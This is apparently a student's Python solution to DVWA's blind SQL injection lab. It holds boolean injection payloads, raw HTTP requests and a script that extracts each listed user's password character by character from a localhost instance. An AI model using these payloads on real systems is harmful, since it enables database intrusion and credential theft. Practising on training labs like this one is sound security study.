#!/usr/bin/env python3

'''These works for the 'easy' challenge of DVWA.

Force True/False values
  1' AND 1=1 # (force TRUE)
  1' AND 1=0 # (force FALSE)

-----

Check for table 'users' existence
  1' AND (select 'x' from users LIMIT 1)='x' #

Check for existence of user 'admin'
  1' AND (select 'x' from users where first_name='admin' LIMIT 1)='x' #

Check for existence of user 'leo'
  1' AND (select 'x' from users where first_name='leo' LIMIT 1)='x' #

Check for existence of user 'Gordon'
  1' AND (select 'x' from users where first_name='Gordon' LIMIT 1)='x' #

-----

Check length of password of user 'admin'
  1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 31)='x' # (TRUE)
  1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 32)='x' # (FALSE)

-----

Check substring of password of user 'admin'
  1' AND (select substring(password, 1, 1) from users where first_name='admin')='a' # (FALSE)
  1' AND (select substring(password, 1, 1) from users where first_name='admin')='a' # (FALSE)
  1' AND (select substring(password, 1, 1) from users where first_name='admin')='a' # (FALSE)
  1' AND (select substring(password, 1, 1) from users where first_name='admin')='a' # (FALSE)
  ...
  1' AND (select substring(password, 1, 1) from users where first_name='admin')='5' # (TRUE)

  1' AND (select substring(password, 2, 1) from users where first_name='admin')='a' # (FALSE)
  ...
  1' AND (select substring(password, 2, 1) from users where first_name='admin')='f' # (TRUE)

-----------------------------

Request GET (difficoltà easy)

GET /dvwa/vulnerabilities/sqli_blind/?id=asd&Submit=Submit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/dvwa/vulnerabilities/sqli_blind/
Cookie: security=low; PHPSESSID=4gehbn1ak4h83ku04v4m99kush
Upgrade-Insecure-Requests: 1


-----

Requesta POST (difficoltà medium)

POST /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://localhost
Connection: close
Referer: http://localhost/dvwa/vulnerabilities/sqli_blind/
Cookie: security=medium; PHPSESSID=vmo15ptvg08ipcrh86tch72ff6
Upgrade-Insecure-Requests: 1

id=1' AND 1=1 #&Submit=Submit

'''

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

URL="http://localhost/dvwa/vulnerabilities/sqli_blind/"

custom_headers = {
    "Cookie": "security=low; PHPSESSID=gov5oiilcf8inpeh6nu8crlsb8"
}

# ------------------------------------

def get_password_length(username):
    global URL
    
    MAX_LENGTH = 1024

    for i in range(1, MAX_LENGTH):
        sql_payload = f"1' AND (select 'x' from users where first_name='{username}' and LENGTH(password) > {i})='x' #"
        params = { "id": sql_payload, "Submit": "Submit" }
        r = requests.get(URL, params=params, headers=custom_headers)
        if "MISSING" in r.text:
            return i

# -----

def get_password(username):
    pass_len = get_password_length(username)

    print(f"[INFO] - Password for username: {username} has {pass_len} length")

    # NOTE: maybe add more characters here
    ALPHABET = ""
    ALPHABET += "0123456789"
    ALPHABET += "abcdefghijklmnopqrstuvwxyz"
    ALPHABET += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    password = ""

    print(f"[INFO] - La password di {user} è ", end="")
    for i in range(1, pass_len+1):
        for c in ALPHABET:
            sql_payload = f"1' AND (select substring(password, {i}, 1) from users where first_name='{username}')='{c}' #"
            params = { "id": sql_payload, "Submit": "Submit" }
            r = requests.get(URL, params=params, headers=custom_headers)
        
            if not "MISSING" in r.text:
                password += c
                # to print in a cool way
                print(c, end="", flush=True)
                break
    print("\n", end="")

    return password

# --------

if __name__ == "__main__":
    users = ["admin", "Gordon", "Hack", "Pablo", "Bob"]
    for user in users:
        password = get_password(user)
        
        
